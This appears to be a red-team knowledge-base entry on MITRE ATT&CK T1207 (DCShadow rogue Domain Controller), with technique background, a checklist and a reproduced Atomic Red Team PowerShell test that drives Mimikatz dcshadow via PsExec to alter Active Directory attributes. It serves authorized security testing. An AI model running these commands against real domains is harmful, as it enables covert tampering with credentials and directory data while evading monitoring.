---
name: "T1207_rogue-domain-controller"
description: "Adversaries may register a rogue Domain Controller to enable manipulation of Active Directory data."
category: "configuration"
version: "18.1"
author: "cyberstrike-official"
tags:
  - mitre-attack
  - enterprise
  - t1207
  - defense-evasion
  - windows
technique_id: "T1207"
tactic: "defense-evasion"
all_tactics:
  - defense-evasion
platforms:
  - Windows
mitre_url: "https://attack.mitre.org/techniques/T1207"
tech_stack:
  - windows
cwe_ids:
  - CWE-693
chains_with:
  []
prerequisites:
  []
severity_boost: {}
---

# T1207 Rogue Domain Controller

## High-Level Description

Adversaries may register a rogue Domain Controller to enable manipulation of Active Directory data. DCShadow may be used to create a rogue Domain Controller (DC). DCShadow is a method of manipulating Active Directory (AD) data, including objects and schemas, by registering (or reusing an inactive registration) and simulating the behavior of a DC. Once registered, a rogue DC may be able to inject and replicate changes into AD infrastructure for any domain object, including credentials and keys.

Registering a rogue DC involves creating a new server and nTDSDSA objects in the Configuration partition of the AD schema, which requires Administrator privileges (either Domain or local to the DC) or the KRBTGT hash. 

This technique may bypass system logging and security monitors such as security information and event management (SIEM) products (since actions taken on a rogue DC may not be reported to these sensors). The technique may also be used to alter and delete replication and other associated metadata to obstruct forensic analysis. Adversaries may also utilize this technique to perform SID-History Injection and/or manipulate AD objects (such as accounts, access control lists, schemas) to establish backdoors for Persistence.

## Kill Chain Phase

- Defense Evasion (TA0005)

**Platforms:** Windows

## What to Check

- [ ] Identify if Rogue Domain Controller technique is applicable to target environment
- [ ] Check Windows systems for indicators of Rogue Domain Controller
- [ ] Assess detection coverage (1 detection strategies)

## How to Test

### Atomic Red Team Tests

The following tests are from [Atomic Red Team](https://github.com/redcanaryco/atomic-red-team) and provide actionable ways to test this technique:

### Atomic Test 1: DCShadow (Active Directory)

Use Mimikatz DCShadow method to simulate behavior of an Active Directory Domain Controller and edit protected attribute.

[DCShadow](https://www.dcshadow.com/)
[Additional Reference](http://www.labofapenetrationtester.com/2018/04/dcshadow.html)

It will set the badPwdCount attribute of the target user (user/machine account) to 9999. You can check after with:
Get-ADObject -LDAPFilter '(samaccountname=<user>)' -Properties badpwdcount | select-object -ExpandProperty badpwdcount

Need SYSTEM privileges locally (automatically obtained via PsExec, so running as admin is sufficient), and Domain Admin remotely.
The easiest is to run elevated and as a Domain Admin user.

**Supported Platforms:** windows
**Elevation Required:** Yes

```powershell
# starting fake DC server, as SYSTEM (required)
$dc_output_file = "PathToAtomicsFolder\..\ExternalPayloads\art-T1207-mimikatz-DC.log"
Remove-Item $dc_output_file -ErrorAction Ignore
$mimikatzParam ="`"log $dc_output_file`" `"lsadump::dcshadow /object:#{object} /attribute:#{attribute} /value:#{value}`" `"exit`""
$dc = Start-Process -FilePath cmd.exe -Verb Runas -ArgumentList "/c '#{psexec_path}' /accepteula -d -s #{mimikatz_path} $mimikatzParam"

# wait for fake DC server to be ready...
Start-Sleep -Seconds 5

# server ready, so trigger replication (push) and wait until it finished
& "#{mimikatz_path}" "lsadump::dcshadow /push" "exit"

Write-Host "`nWaiting for fake DC server to return"
Wait-Process $dc

Write-Host "`nOutput from fake DC server:"
Get-Content $dc_output_file
Start-Sleep 1 # wait a little until the file is not locked anymore so we can actually delete it
Remove-Item $dc_output_file -ErrorAction Ignore

Write-Host "End of DCShadow"
```

**Dependencies:**
- Mimikatz executor must exist on disk and at specified location (#{mimikatz_path})
- PsExec tool from Sysinternals must exist on disk at specified location (#{psexec_path})


### Manual Testing

If Atomic Red Team tests are not applicable, manually verify the technique by:

1. **Identify Attack Surface**: Determine if the target environment is susceptible to Rogue Domain Controller by examining the target platforms (Windows).

2. **Assess Existing Defenses**: Review whether mitigations for T1207 are in place. If defenses are absent or misconfigured, this technique may be exploitable.

3. **Execute Test**: Use tools and methods described in the MITRE ATT&CK page and external references below.

## Remediation Guide

No specific mitigations documented for this technique.

## Detection

### Detection Strategy for Rogue Domain Controller (DCShadow) Registration and Replication Abuse


## Risk Assessment

| Finding | Severity | Impact |
| ------- | -------- | ------ |
| Rogue Domain Controller technique applicable | High | Defense Evasion |

## CWE Categories

| CWE ID | Title |
| ------ | ----- |
| CWE-693 | Protection Mechanism Failure |


## References

- [DCShadow Blog](https://www.dcshadow.com/)
- [Adsecurity Mimikatz Guide](https://adsecurity.org/?page_id=1821)
- [GitHub DCSYNCMonitor](https://github.com/shellster/DCSYNCMonitor)
- [Microsoft DirSync](https://msdn.microsoft.com/en-us/library/ms677626.aspx)
- [ADDSecurity DCShadow Feb 2018](https://adds-security.blogspot.fr/2018/02/detecter-dcshadow-impossible.html)
- [Atomic Red Team - T1207](https://github.com/redcanaryco/atomic-red-team/tree/master/atomics/T1207)
- [MITRE ATT&CK - T1207](https://attack.mitre.org/techniques/T1207)
